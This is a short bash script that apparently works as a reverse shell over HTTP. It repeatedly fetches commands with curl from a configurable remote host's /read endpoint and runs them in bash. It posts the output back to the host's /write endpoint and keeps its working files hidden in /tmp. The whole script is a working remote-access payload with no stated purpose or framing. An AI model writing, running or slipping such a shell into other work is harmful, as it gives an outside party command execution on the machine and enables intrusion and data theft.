#!/bin/bash
set -e
A="${1-127.0.0.1:8888}"
F="/tmp/.shell_server_in.$RANDOM"
L="/tmp/.shell_server_lock.$RANDOM"

touch "$L"
(while test -f "$L"; do
    curl -sSLN -X GET "$A/read?id=&side=s" -H "Accept: application/octet-stream" || break
done) | (bash 2>&1; rm "$L") | (while true; do
    dd bs=1024 count=1 of="$F" 2>/dev/null
    < "$F"
    curl -sSL -X POST "$A/write?id=&side=s" -H "Content-Type: application/octet-stream" --data-binary "@$F" > /dev/null || break
done)
rm -f "$F" "$L"
